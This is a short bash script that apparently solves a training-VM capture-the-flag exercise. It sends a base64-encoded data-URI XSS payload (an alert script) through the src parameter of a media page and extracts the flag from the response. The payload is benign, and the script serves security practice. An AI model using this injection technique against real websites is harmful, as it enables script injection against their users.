#!/bin/bash

echo "input the VM ip address :"
read ip

url="http://${ip}/index.php?page=media&src=%3Cdata:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="

response=$(curl -s "$url" | grep "flag")
response=$(cut -f3 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"